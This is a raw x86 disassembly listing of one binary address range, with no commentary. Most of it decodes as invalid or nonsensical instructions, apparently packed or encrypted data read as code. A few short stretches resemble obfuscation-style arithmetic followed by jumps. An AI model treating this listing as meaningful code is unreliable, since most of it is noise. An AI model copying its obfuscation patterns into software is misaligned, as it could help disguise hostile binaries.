  40c760:	lods   al,BYTE PTR ds:[esi]
  40c761:	ins    DWORD PTR es:[edi],dx
  40c762:	mov    ds:0xe4649282,eax
  40c767:	push   cs
  40c768:	pop    ecx
  40c769:	(bad)  
  40c76a:	sti    
  40c76b:	cmp    BYTE PTR [ebp+ebx*4+0x41],cl
  40c76f:	in     al,0x77
  40c771:	xchg   ecx,eax
  40c772:	push   esi
  40c773:	inc    eax
  40c774:	das    
  40c775:	in     al,dx
  40c776:	or     dh,dl
  40c778:	mov    ebx,0x5b988a02
  40c77d:	sbb    eax,0xc63fceac
  40c782:	(bad)  [eax]
  40c784:	xcrypt-ecb (bad)
  40c785:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c786:	or     al,0x27
  40c788:	imul   edx,eax,0x56650d4d
  40c78e:	dec    edx
  40c78f:	push   ebp
  40c790:	lahf   
  40c791:	fptan  
  40c793:	imul   ecx,DWORD PTR [eax+0x42bcd34c],0x5b
  40c79a:	js     0x40c7b7
  40c79c:	sbb    al,0x12
  40c79e:	mov    dl,dl
  40c7a0:	or     ecx,edx
  40c7a2:	xor    BYTE PTR [edi],cl
  40c7a4:	xchg   esi,eax
  40c7a5:	lea    ecx,ds:0x830a8da3
  40c7ab:	aaa    
  40c7ac:	cli    
  40c7ad:	sbb    DWORD PTR [bp+si-0x17],ecx
  40c7b1:	and    BYTE PTR [ebp+0x6],ch
  40c7b4:	push   esi
  40c7b5:	ds ret 0xa9e2
  40c7b9:	ret    0x3020
  40c7bc:	xor    esp,edi
  40c7be:	pop    es
  40c7bf:	mov    edx,0xb33ffcf5
  40c7c4:	loopne 0x40c7e4
  40c7c6:	pop    es
  40c7c7:	cmp    BYTE PTR [edi+eiz*4+0x6b456265],dh
  40c7ce:	mov    esi,0xb2159136
  40c7d3:	pop    esi
  40c7d4:	mov    BYTE PTR [esi-0x7cd68cd7],dh
  40c7da:	bound  ecx,QWORD PTR [ebx-0x7ce77a49]
  40c7e0:	xchg   edx,eax
  40c7e1:	xchg   DWORD PTR [edi],ebx
  40c7e3:	and    al,0x87
  40c7e5:	sti    
  40c7e6:	xchg   DWORD PTR [eax+ecx*4-0x4362aa2e],eax
  40c7ed:	xor    al,0x4
  40c7ef:	pushf  
  40c7f0:	add    cl,BYTE PTR [edi-0x74]
  40c7f3:	mov    cl,cl
  40c7f5:	(bad)  
  40c7f6:	push   0xfffffff8
  40c7f8:	test   al,0xff
  40c7fa:	pusha  
  40c7fb:	repnz pop esp
  40c7fd:	nop
  40c7fe:	dec    ebx
  40c7ff:	outs   dx,DWORD PTR ds:[esi]
  40c800:	push   cs
  40c801:	jae    0x40c794
  40c803:	test   al,0x54
  40c805:	outs   dx,DWORD PTR ds:[esi]
  40c806:	or     dh,dh
  40c808:	jge    0x40c861
  40c80a:	jl     0x40c816
  40c80c:	outs   dx,DWORD PTR ds:[esi]
  40c80d:	inc    esi
  40c80e:	mov    eax,ds:0x6feb123a
  40c813:	js     0x40c83e
  40c815:	jg     0x40c843
  40c817:	nop
  40c818:	lds    ebp,FWORD PTR [ebx+0x9a3aae2]
  40c81e:	adc    ah,BYTE PTR [ebp+ecx*4-0x61]
  40c822:	lds    edx,FWORD PTR [edx-0x79ffba3a]
  40c828:	retf   
  40c829:	hlt    
  40c82a:	jae    0x40c826
  40c82c:	sysenter 
  40c82e:	ins    BYTE PTR es:[edi],dx
  40c82f:	pop    es
  40c830:	mov    ah,0x5d
  40c832:	(bad)  
  40c833:	push   0xffffffee
  40c835:	popf   
  40c836:	lea    ebx,[esi+ebp*2]
  40c839:	sbb    al,0xe1
  40c83b:	outs   dx,DWORD PTR ds:[esi]
  40c83c:	mov    ebp,0xc5e1fc50
  40c841:	jmp    0x9627:0x3417f4a
  40c848:	hlt    
  40c849:	jmp    0x978c:0x151e8bd4
  40c850:	jg     0x40c88e
  40c852:	add    ebp,DWORD PTR [ebx]
  40c854:	ret    0xb5d3
  40c857:	mov    al,0xd
  40c859:	jo     0x40c834
  40c85b:	push   es
  40c85c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c85d:	inc    ecx
  40c85e:	mov    dl,0x31
  40c860:	fiadd  WORD PTR [edx+0x2f625a9d]
  40c866:	jbe    0x40c84f
  40c868:	sub    BYTE PTR [ecx+0x7a1e3b8],dl
  40c86e:	pop    esi
  40c86f:	xchg   edi,eax
  40c870:	cli    
  40c871:	inc    esi
  40c872:	or     DWORD PTR [edi+0xd],0xffffffd0
  40c876:	mov    ds:0x31d63d27,eax
  40c87b:	or     DWORD PTR ds:0xeaddee9f,edi
  40c881:	sub    al,0x57
  40c883:	add    al,0x96
  40c885:	mov    al,0x14
  40c887:	sti    
  40c888:	arpl   WORD PTR [edx-0x25],bp
  40c88b:	push   ds
  40c88c:	iret   
  40c88d:	or     dl,BYTE PTR ds:0x70269e4
  40c893:	pop    ebp
  40c894:	addr16 jns 0x40c846
  40c897:	jge    0x40c84e
  40c899:	int3   
  40c89a:	push   esi
  40c89b:	fisub  DWORD PTR ds:0x6ab82f91
  40c8a1:	in     eax,dx
  40c8a2:	push   cs
  40c8a3:	std    
  40c8a4:	or     BYTE PTR [ebp+0x1c9b9044],ah
  40c8aa:	or     al,0xf2
  40c8ac:	xor    DWORD PTR [edx],esi
  40c8ae:	dec    eax
  40c8af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8b0:	sbb    esp,DWORD PTR [edi]
  40c8b2:	es mov esi,0xb8adc52a
  40c8b8:	scas   eax,DWORD PTR es:[edi]
  40c8b9:	mov    bl,0x12
  40c8bb:	dec    ebp
  40c8bc:	ja     0x40c8fa
  40c8be:	cdq    
  40c8bf:	xor    BYTE PTR [edi],bl
  40c8c1:	add    al,0xf
  40c8c3:	sbb    DWORD PTR [eax+0x79],0x6937d95b
  40c8ca:	jp     0x40c86c
  40c8cc:	jp     0x40c911
  40c8ce:	(bad)  
  40c8cf:	fidiv  DWORD PTR [ecx-0x5788b2a1]
  40c8d5:	pop    esi
  40c8d6:	jge    0x40c914
  40c8d8:	fdiv   DWORD PTR [edx]
  40c8da:	add    DWORD PTR [esi+esi*1],ebx
  40c8dd:	das    
  40c8de:	outs   dx,DWORD PTR ds:[esi]
  40c8df:	cwde   
  40c8e0:	enter  0x7d42,0x23
  40c8e4:	jge    0x40c8bf
  40c8e6:	xor    bh,ah
  40c8e8:	and    DWORD PTR [ecx],edx
  40c8ea:	jae    0x40c87a
  40c8ec:	inc    ecx
  40c8ed:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	inc    ecx
  40c919:	pop    ebx
  40c91a:	sbb    al,0xd1
  40c91c:	in     al,dx
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c94f
  40c925:	dec    ecx
  40c926:	(bad)  
  40c927:	fs or  bl,cl
  40c92a:	adc    DWORD PTR [ebx+edx*2+0x42],ebx
  40c92e:	(bad)  
  40c92f:	shl    ecx,1
  40c931:	sub    al,0x1
  40c933:	lods   al,BYTE PTR ds:[esi]
  40c934:	pop    es
  40c935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c936:	pop    es
  40c937:	in     al,dx
  40c938:	mov    esp,0x4cd130ed
  40c93d:	dec    ebp
  40c93e:	adc    DWORD PTR [edi-0x9],ecx
  40c941:	mov    bl,0x2a
  40c943:	push   esi
  40c944:	add    eax,0x54f513ca
  40c949:	into   
  40c94a:	jmp    0x3d4f:0x32ff7bf3
  40c951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c952:	mov    ebp,0x3385a72f
  40c957:	sbb    al,0x0
  40c959:	imul   esp,DWORD PTR [edi+0xa],0xc
  40c95d:	jle    0x40c95a
  40c95f:	(bad)  [edi]
  40c961:	aad    0xed
  40c963:	pop    eax
  40c964:	push   ss
  40c965:	or     DWORD PTR [edx+0x28],eax
  40c968:	adc    edx,edi
  40c96a:	mov    edx,0xead246c0
  40c96f:	mov    DWORD PTR [ebp-0x2e6d1e58],esp
  40c975:	in     eax,dx
  40c976:	les    esi,FWORD PTR [esp+ecx*1]
  40c979:	js     0x40c975
  40c97b:	lds    esp,FWORD PTR [esi]
  40c97d:	sub    ah,BYTE PTR [ebp+0x5ad60bba]
  40c983:	(bad)  
  40c984:	cli    
  40c985:	push   ss
  40c986:	mov    al,ds:0x57598d14
  40c98b:	sub    al,0xda
  40c98d:	xlat   BYTE PTR ds:[ebx]
  40c98e:	pop    ss
  40c98f:	shr    DWORD PTR [esi-0x1fee94d9],1
  40c995:	(bad)  
  40c996:	sbb    ah,BYTE PTR [ecx+0x7029abd1]
  40c99c:	scas   al,BYTE PTR es:[edi]
  40c99d:	push   0xffffffa7
  40c99f:	ret    0xa504
  40c9a2:	sbb    eax,ebx
  40c9a4:	into   
  40c9a5:	imul   eax,DWORD PTR [ebx-0x71],0xffffffbf
  40c9a9:	jmp    0x40c946
  40c9ab:	fdiv   QWORD PTR [esi]
  40c9ad:	add    al,0xe5
  40c9af:	fs dec esi
  40c9b1:	cmp    dh,BYTE PTR [ebx+0x14]
  40c9b4:	cmp    al,0xc
  40c9b6:	test   eax,0xd76525fc
  40c9bb:	push   esi
  40c9bc:	mov    ebp,0x880e5c4e
  40c9c1:	cld    
  40c9c2:	pushf  
  40c9c3:	popa   
  40c9c4:	push   es
  40c9c5:	jb     0x40c9e2
  40c9c7:	rol    DWORD PTR [esi+ebx*4-0x50],1
  40c9cb:	jp     0x40c9fc
  40c9cd:	imul   eax,DWORD PTR [eax-0x53],0xcbc0c35f
  40c9d4:	addr16 std 
  40c9d6:	call   edi
  40c9d8:	mov    cl,0x1d
  40c9da:	and    al,BYTE PTR [ecx+ebx*4-0x41]
  40c9de:	js     0x40ca29
  40c9e0:	and    dl,BYTE PTR [eax+esi*8-0xc]
  40c9e4:	sahf   
  40c9e5:	(bad)  
  40c9e6:	data16 test dl,0xb8
  40c9ea:	or     al,0x84
  40c9ec:	in     eax,dx
  40c9ed:	mov    bh,0x67
  40c9ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9f0:	lahf   
  40c9f1:	call   0x661d:0x3fb0d080
  40c9f8:	mov    edx,0xf15aff24
  40c9fd:	push   ecx
  40c9fe:	add    eax,0xf26e9b9a
  40ca03:	mov    esi,0x79099d34
  40ca08:	jnp    0x40c9bb
  40ca0a:	ret    0x300c
  40ca0d:	lods   eax,DWORD PTR ds:[esi]
  40ca0e:	mov    BYTE PTR ds:0xa749d448,bh
  40ca14:	dec    DWORD PTR [edi]
  40ca16:	mov    dh,0xdf
  40ca18:	xchg   DWORD PTR [ebp-0x1a],esi
  40ca1b:	xchg   bl,ch
  40ca1d:	or     esi,esi
  40ca1f:	and    al,0x6c
  40ca21:	call   0x1be5:0x6f4d4e5f
  40ca28:	and    eax,0xf1ec2040
  40ca2d:	xlat   BYTE PTR ds:[ebx]
  40ca2e:	sub    ecx,esi
  40ca30:	cld    
  40ca31:	pop    ss
  40ca32:	ins    DWORD PTR es:[edi],dx
  40ca33:	xchg   ecx,eax
  40ca34:	icebp  
  40ca35:	test   al,0xea
  40ca37:	cmp    BYTE PTR [edi+0x7],bl
  40ca3a:	inc    ebx
  40ca3b:	(bad)  
  40ca3c:	imul   edx,DWORD PTR ds:0x9e1c08f7,0x6a
  40ca43:	cmc    
  40ca44:	push   ebp
  40ca45:	push   edi
  40ca46:	dec    ebx
  40ca47:	mov    eax,ds:0x23f9f8ea
  40ca4c:	out    dx,eax
  40ca4d:	je     0x40ca2d
  40ca4f:	jg     0x40ca48
  40ca51:	sbb    esp,DWORD PTR [edx+0x56]
  40ca54:	cmp    al,0x7e
  40ca56:	push   0xffffffea
  40ca58:	aad    0x53
  40ca5a:	loop   0x40ca20
  40ca5c:	or     ebp,DWORD PTR [edi]
  40ca5e:	pop    ebx
  40ca5f:	push   eax
  40ca60:	mov    ds:0x18c48db6,al
  40ca65:	loop   0x40c9f1
  40ca67:	xor    BYTE PTR [ebp+0x3c],dh
  40ca6a:	and    DWORD PTR [esi-0x7c],edi
  40ca6d:	and    DWORD PTR [eax],0xffffffa7
  40ca70:	ret    
  40ca71:	in     eax,0x5b
  40ca73:	inc    ebp
  40ca74:	xor    eax,0xa50c52a2
  40ca79:	outs   dx,BYTE PTR ds:[esi]
  40ca7a:	enter  0x8ad8,0xca
  40ca7e:	test   al,0x12
  40ca80:	cmp    edi,esp
  40ca82:	cmp    al,0x65
  40ca84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca85:	fdivr  st(1),st
  40ca87:	ror    dl,cl
  40ca89:	pop    ds
  40ca8a:	neg    DWORD PTR [eax+esi*1]
  40ca8d:	shr    BYTE PTR [esi],1
  40ca8f:	pop    esi
  40ca90:	inc    esi
  40ca91:	push   edx
  40ca92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca93:	and    BYTE PTR [esi],ah
  40ca95:	jmp    0x40ca91
  40ca97:	inc    esp
  40ca98:	jle    0x40cb02
  40ca9a:	sbb    ebp,DWORD PTR [ebp+0x15]
  40ca9d:	fldcw  WORD PTR [edi-0x3]
  40caa0:	cmp    BYTE PTR [esi-0x1c],dh
  40caa3:	mov    esp,0xb97b6303
  40caa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40caa9:	cmp    BYTE PTR [eax],cl
  40caab:	cmp    eax,0xeb8dd4f1
  40cab0:	add    cl,BYTE PTR [eax]
  40cab2:	in     al,dx
  40cab3:	outs   dx,DWORD PTR ds:[esi]
  40cab4:	xor    DWORD PTR [esi],edx
  40cab6:	add    eax,0x4d39c689
  40cabb:	and    ebp,edx
  40cabd:	or     esi,DWORD PTR [esi]
  40cabf:	sbb    al,0xc
  40cac1:	cmp    BYTE PTR [eax-0x3],dl
  40cac4:	adc    al,0x6d
  40cac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cac7:	pop    ebp
  40cac8:	jo     0x40ca88
  40caca:	lock (bad) 
  40cacc:	or     BYTE PTR [edx+edx*2+0x2a4ade9f],bl
  40cad3:	repz das 
  40cad5:	push   cs
  40cad6:	push   0xffffff89
  40cad8:	cs dec esp
  40cada:	xchg   esi,eax
  40cadb:	dec    eax
  40cadc:	dec    ecx
  40cadd:	(bad)
  40cae1:	jbe    0x40cacb
  40cae3:	ins    DWORD PTR es:[edi],dx
  40cae4:	gs cld 
  40cae6:	mov    ah,0xd
  40cae8:	ds int3 
  40caea:	outs   dx,DWORD PTR es:[esi]
  40caec:	pop    ebx
  40caed:	xchg   ecx,eax
  40caee:	sar    BYTE PTR [ebp+0x7192c19f],cl
  40caf4:	mov    DWORD PTR [ecx+0x1eaec68],esp
  40cafa:	call   0x6646c288
  40caff:	sar    edx,cl
  40cb01:	les    eax,FWORD PTR [ebx-0x21]
  40cb04:	cwde   
  40cb05:	jne    0x40cb2c
  40cb07:	push   eax
  40cb08:	add    DWORD PTR [ecx],ecx
  40cb0a:	jg     0x40cad7
  40cb0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb0d:	mov    eax,ds:0x62542b6a
  40cb12:	xchg   esi,eax
  40cb13:	jmp    0x8032197b
  40cb18:	aas    
  40cb19:	lahf   
  40cb1a:	ds jp  0x40cb4c
  40cb1d:	jecxz  0x40cac0
  40cb1f:	cmc    
  40cb20:	add    BYTE PTR [edx],ch
  40cb22:	dec    esp
  40cb23:	push   ebp
  40cb24:	or     eax,0xc54b186d
  40cb29:	sbb    al,0xf0
  40cb2b:	inc    ecx
  40cb2c:	pop    esi
  40cb2d:	mov    dh,0x3e
  40cb2f:	push   ebx
  40cb30:	sbb    ebp,DWORD PTR [ebp+edi*8+0x60]
  40cb34:	jae    0x40cb4d
  40cb36:	jns    0x40cac5
  40cb38:	cmp    esi,ebp
  40cb3a:	jle    0x40cbb5
  40cb3c:	adc    dl,cl
  40cb3e:	add    eax,0x45faf4c
  40cb43:	ins    DWORD PTR es:[edi],dx
  40cb44:	sbb    eax,0x1da7fd4c
  40cb49:	mov    BYTE PTR [esi+edi*8],0x10
  40cb4d:	(bad)  
  40cb4e:	fist   DWORD PTR [ecx]
  40cb50:	xchg   ebx,eax
  40cb51:	mov    eax,ebx
  40cb53:	sbb    al,0x31
  40cb55:	mov    DWORD PTR [ecx-0x35],esp
  40cb58:	jle    0x40cb7f
  40cb5a:	push   es
  40cb5b:	mov    bl,0xf2
  40cb5d:	push   ecx
  40cb5e:	int3   
  40cb5f:	xchg   edi,eax
  40cb60:	mov    cl,0xe6
  40cb62:	sbb    ebp,DWORD PTR [edx-0xc58c978]
  40cb68:	repnz inc ebp
  40cb6a:	xchg   ebx,eax
  40cb6b:	mov    es,esi
  40cb6d:	and    DWORD PTR [eax],ecx
  40cb6f:	lea    esp,[ebp-0x370767c6]
  40cb75:	ror    DWORD PTR [eax],0x7d
  40cb78:	xchg   ebp,eax
  40cb79:	les    edi,FWORD PTR [ebx-0x69]
  40cb7c:	adc    BYTE PTR [edi],bl
  40cb7e:	sub    eax,0x58e17067
  40cb83:	jne    0x40cb0d
  40cb85:	rcl    DWORD PTR [edx+eiz*1+0xd],1
  40cb89:	les    ecx,FWORD PTR [edi+0x5d]
  40cb8c:	sub    esi,DWORD PTR [esi]
  40cb8e:	inc    edi
  40cb8f:	(bad)  
  40cb90:	stc    
  40cb91:	dec    ebx
  40cb92:	cmc    
  40cb93:	pop    ss
  40cb94:	inc    esp
  40cb95:	test   DWORD PTR [eax+ebx*8],edi
  40cb98:	or     eax,0xbcaf27e4
  40cb9d:	and    eax,0x8c848fc0
  40cba2:	sbb    BYTE PTR [edi-0x5d],dl
  40cba5:	pushf  
  40cba6:	mov    ds,WORD PTR [ecx]
  40cba8:	xor    DWORD PTR [ebx+0x7e],esp
  40cbab:	cmp    eax,0xff4aa4e
  40cbb0:	loopne 0x40cbc3
  40cbb2:	or     edx,DWORD PTR [eax+0x55]
  40cbb5:	ret    0x17e5
  40cbb8:	test   DWORD PTR [ebx+ebp*4-0x1c],edx
  40cbbc:	xchg   ebx,eax
  40cbbd:	daa    
  40cbbe:	xchg   edi,eax
  40cbbf:	push   eax
  40cbc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbc1:	addr16 push ds
  40cbc3:	fs xchg edx,eax
  40cbc5:	mov    eax,0x6e04e2fd
  40cbca:	in     al,dx
  40cbcb:	push   ecx
  40cbcc:	jmp    0x6b8955af
  40cbd1:	push   ebx
  40cbd2:	xchg   edx,eax
  40cbd3:	out    0xdf,eax
  40cbd5:	rol    bl,0xab
  40cbd8:	outs   dx,BYTE PTR ds:[esi]
  40cbd9:	retf   
  40cbda:	mov    DWORD PTR [edx+0x6b3fff72],ebx
  40cbe0:	push   ds
  40cbe1:	push   0x781241bf
  40cbe6:	jg     0x40cbb8
  40cbe8:	sub    al,0xec
  40cbea:	(bad)  
  40cbec:	dec    esp
  40cbed:	mul    DWORD PTR [edx+ebx*1-0x8]
  40cbf1:	mov    bl,0x43
  40cbf3:	cmp    ebp,DWORD PTR [ebx+0x2c897e0f]
  40cbf9:	pushf  
  40cbfa:	xor    eax,0xb6bbcdb3
  40cbff:	inc    esp
  40cc00:	push   ss
  40cc01:	xchg   edi,eax
  40cc02:	sbb    ebx,DWORD PTR [ecx-0x7e]
  40cc05:	sbb    dl,BYTE PTR [ebp+ebp*1-0x2e]
  40cc09:	popf   
  40cc0a:	mov    ds:0x17ad36cf,al
  40cc0f:	loope  0x40cbd1
  40cc11:	cld    
  40cc12:	xor    BYTE PTR [edx+0x5de23df2],al
  40cc18:	push   es
  40cc19:	pop    edx
  40cc1a:	mov    bl,0xc1
  40cc1c:	fisttp WORD PTR [ebx+0x6a]
  40cc1f:	sbb    ebp,DWORD PTR [esi-0x25ee302f]
  40cc25:	fs clc 
  40cc27:	test   DWORD PTR [ebx-0x77a530d7],edi
  40cc2d:	push   ecx
  40cc2e:	sbb    edi,edx
  40cc30:	bound  ecx,QWORD PTR [ebx]
  40cc32:	pop    ebx
  40cc33:	test   BYTE PTR ss:[eax-0x4b],dl
  40cc37:	mov    esp,0x34ba97d6
  40cc3c:	jp     0x40cc1e
  40cc3e:	in     eax,dx
  40cc3f:	jg     0x40cc70
  40cc41:	stos   DWORD PTR es:[edi],eax
  40cc42:	mov    eax,0x19b61ee8
  40cc47:	aam    0xcd
  40cc49:	adc    DWORD PTR [edx+0x65],edx
  40cc4c:	jge    0x40cbe8
  40cc4e:	mov    dl,0xb6
  40cc50:	mov    bl,0xa3
  40cc52:	push   edi
  40cc53:	lods   al,BYTE PTR ds:[esi]
  40cc54:	push   es
  40cc55:	out    dx,eax
  40cc56:	mov    edx,0x1d43248
  40cc5b:	js     0x40ccc3
  40cc5d:	and    edx,DWORD PTR ds:0x4bc06be5
  40cc63:	mov    edi,0xc0cc074a
  40cc68:	repnz imul ecx,DWORD PTR [esi-0x6863262],0x4bb5b398
  40cc73:	jno    0x40cc61
  40cc75:	lods   eax,DWORD PTR ds:[esi]
  40cc76:	shl    BYTE PTR [ecx+0x76],cl
  40cc79:	push   ebp
  40cc7a:	out    dx,eax
  40cc7b:	loop   0x40cc4e
  40cc7d:	ror    DWORD PTR [ebx+0x408c6e65],0x1f
  40cc84:	outs   dx,DWORD PTR ds:[esi]
  40cc85:	pop    ebp
  40cc86:	or     dh,cl
  40cc88:	or     BYTE PTR [edi-0x622a8991],al
  40cc8e:	adc    dl,ah
  40cc90:	lods   eax,DWORD PTR ds:[esi]
  40cc91:	call   0xf64d:0x91ba08d
  40cc98:	mov    esi,0x4ba74b5d
  40cc9d:	cmp    DWORD PTR [edi+0x5497d61b],esp
  40cca3:	fcmovbe st,st(2)
  40cca5:	or     ebp,DWORD PTR [esi+0x6436bad3]
  40ccab:	es push esp
  40ccad:	fs in  eax,dx
  40ccaf:	mov    esi,0xa55e5199
  40ccb4:	push   ds
  40ccb5:	dec    edi
  40ccb6:	cld    
  40ccb7:	or     DWORD PTR [ebx],edi
  40ccb9:	(bad)  
  40ccbb:	hlt    
  40ccbc:	cdq    
  40ccbd:	scas   eax,DWORD PTR es:[edi]
  40ccbe:	jle    0x40cd31
  40ccc0:	push   cs
  40ccc1:	sub    esp,DWORD PTR [ebp-0x7ccd446]
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	or     DWORD PTR [ebp+0xb7726af],0xffffff90
  40cd1c:	jo     0x40cd8e
  40cd1e:	lahf   
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40cce0
  40cd23:	retf   
  40cd24:	dec    esp
  40cd25:	fsub   DWORD PTR [edi+edi*2]
  40cd28:	push   ds
  40cd29:	mov    ecx,0x8aac16b2
  40cd2e:	stc    
  40cd2f:	dec    ecx
  40cd30:	lods   eax,DWORD PTR ds:[esi]
  40cd31:	cmp    DWORD PTR [ecx+eax*4-0x2c5f01a6],eax
  40cd38:	outs   dx,BYTE PTR ds:[esi]
  40cd39:	sub    al,0x17
  40cd3b:	adc    esp,edi
  40cd3d:	xor    al,0xf9
  40cd3f:	sti    
  40cd40:	cwde   
  40cd41:	xchg   DWORD PTR [esi],ecx
  40cd43:	push   esi
  40cd44:	sbb    BYTE PTR [eax+0x7],al
  40cd47:	cmp    ah,ah
  40cd49:	or     al,0xcd
  40cd4b:	(bad)  
  40cd4c:	sub    DWORD PTR [ebx-0x30],0x41b61cb2
  40cd53:	add    al,0xae
  40cd55:	lea    edx,[edi+0x5b]
  40cd58:	fwait
  40cd59:	enter  0x795c,0x2b
  40cd5d:	arpl   WORD PTR [eax+0x9e9a61a],bp
  40cd63:	outs   dx,DWORD PTR ds:[esi]
  40cd64:	fwait
  40cd65:	and    BYTE PTR [edx-0x2509d773],dl
  40cd6b:	dec    ebx
  40cd6c:	xor    BYTE PTR [edx+0x2b6e1635],ah
  40cd72:	inc    eax
  40cd73:	pop    esp
  40cd74:	sub    ebp,DWORD PTR [eax]
  40cd76:	push   eax
  40cd77:	out    dx,eax
  40cd78:	aad    0x3a
  40cd7a:	pushf  
  40cd7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd7c:	add    DWORD PTR [esi],0x72
  40cd7f:	ja     0x40cdfb
  40cd81:	push   edi
  40cd82:	push   es
  40cd83:	mov    ebp,es
  40cd85:	cwde   
  40cd86:	pop    ebp
  40cd87:	dec    esi
  40cd88:	and    eax,0xc2f9ba9f
  40cd8d:	popf   
  40cd8e:	inc    edi
  40cd8f:	xlat   BYTE PTR ds:[ebx]
  40cd90:	leave  
  40cd91:	sub    al,0x37
  40cd93:	ffree  st(3)
  40cd95:	xlat   BYTE PTR ds:[ebx]
  40cd96:	mov    ah,0x5d
  40cd98:	rol    DWORD PTR [eax+esi*1-0x3a],1
  40cd9c:	or     edx,DWORD PTR [edx]
  40cd9e:	(bad)  
  40cd9f:	sub    dl,bl
  40cda1:	jns    0x40cd6f
  40cda3:	arpl   WORD PTR [eax-0x5f02e9d1],di
  40cda9:	sub    al,0x64
  40cdab:	lods   al,BYTE PTR ds:[esi]
  40cdac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdad:	fist   DWORD PTR [ecx-0x31]
  40cdb0:	mov    fs,ebp
  40cdb2:	pop    ebx
  40cdb3:	retf   
  40cdb4:	sub    eax,0xf4ce907d
  40cdb9:	ror    BYTE PTR [esi+0x76c81a9],0xee
  40cdc0:	jle    0x40cd44
  40cdc2:	shr    eax,0x51
  40cdc5:	or     al,0x28
  40cdc7:	sub    eax,0x38aaa55f
  40cdcc:	cdq    
  40cdcd:	dec    edi
  40cdce:	or     eax,0xc359ea53
  40cdd3:	mov    cl,0x45
  40cdd5:	leave  
  40cdd6:	popf   
  40cdd7:	pop    ss
  40cdd8:	shl    BYTE PTR [ecx+edi*8],cl
  40cddb:	push   esp
  40cddc:	jmp    0x40ce42
  40cdde:	fs push esp
  40cde0:	rol    DWORD PTR [edi],1
  40cde2:	push   0x7a0f8276
  40cde7:	js     0x40cd73
  40cde9:	jle    0x40ce1c
  40cdeb:	(bad)  
  40cdec:	push   ebp
  40cded:	sar    DWORD PTR [ecx+0x77],cl
  40cdf0:	lods   eax,DWORD PTR ds:[esi]
  40cdf1:	jns    0x40ce57
  40cdf3:	xchg   ebx,eax
  40cdf4:	pop    edx
  40cdf5:	mov    DWORD PTR [ebx],ebx
  40cdf7:	inc    esp
  40cdf8:	outs   dx,BYTE PTR ds:[esi]
  40cdf9:	mov    BYTE PTR [edi],dh
  40cdfb:	lods   eax,DWORD PTR ds:[esi]
  40cdfc:	add    eax,0xe9d547b0
  40ce01:	and    ah,BYTE PTR [eax+0x1f]
  40ce04:	(bad)  
  40ce05:	mov    ebp,0x8bd178c3
  40ce0a:	mov    esi,0xa73d308e
  40ce0f:	add    eax,0x6123f405
  40ce14:	jmp    0x40cda0
  40ce16:	jbe    0x40ce45
  40ce18:	loopne 0x40cdcb
  40ce1a:	adc    ch,cl
  40ce1c:	ret    0xcdd7
  40ce1f:	lock sub eax,edx
  40ce22:	test   DWORD PTR [ecx+0x6202d91c],esi
  40ce28:	add    DWORD PTR [ebx],0x4d
  40ce2b:	(bad)  
  40ce2d:	mov    ah,0x1e
  40ce2f:	adc    bh,BYTE PTR [ecx+0x65ada42e]
  40ce35:	and    bh,dh
  40ce37:	cmp    al,0x1
  40ce39:	add    al,0x25
  40ce3b:	nop
  40ce3c:	xchg   ebp,eax
  40ce3d:	rcl    DWORD PTR [ebx-0x78],0x3
  40ce41:	cli    
  40ce42:	jge    0x40ceb1
  40ce44:	aaa    
  40ce45:	int    0x20
  40ce47:	fisubr WORD PTR [esi]
  40ce49:	fs test eax,0xeada8a74
  40ce4f:	mul    DWORD PTR [ecx-0x3df453f]
  40ce55:	xor    eax,0x1a967f9f
  40ce5a:	data16 fs jno 0x40ce89
  40ce5e:	retf   0x76d5
  40ce61:	jg     0x40ceb2
